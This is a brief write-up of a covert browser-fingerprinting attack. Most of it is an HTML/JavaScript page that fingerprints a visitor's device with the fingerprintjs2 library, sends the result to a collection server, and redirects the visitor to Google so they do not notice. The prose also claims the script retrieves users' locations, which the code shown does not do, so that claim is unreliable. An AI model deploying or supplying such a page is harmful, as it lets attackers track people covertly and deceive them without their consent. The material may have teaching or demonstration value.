# Fingerprint 

The attacker uses javascript embedded in the website to fingerprint users' devices. The javascript can also retrieve users' locations, and it redirects to another unharmful webpage such as Google search, so the users are not aware of the attack.

```javascript
<!DOCTYPE html>
<html>
  <head>
     <meta charset="UTF-8">
    <title>Example "Fingerprinting" Application</title>
    <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
    <script src="https://valve.github.io/fingerprintjs2/fingerprint2.js"></script>
  </head>
  <body>
    <h1>Fingerprint Example</h1>
        <div id="result"></div>
        <code id="components"></code>
        <script>
          console.log("test");
          setTimeout(function () {
              window.location.href = "https://www.google.com"; //will redirect
          }, 200); //will call the function after 200 (X) milliseconds or ready().
          new Fingerprint2().get(function(result, components){
            // this will use all available fingerprinting sources
            console.log(result);
            $('#result').text(JSON.stringify(result));            
            // components is an array of all fingerprinting components used
            console.log(components);
            $('#components').text(JSON.stringify(components));
            //Send components fingerprint to server
            $.ajax({
              url: 'localhost:8882/collectFingerprint',
              type: 'POST',
              contentType:'application/json',
              data: JSON.stringify(result),
              dataType:'json'
            });
          });
        </script>
  </body>
</html>
```
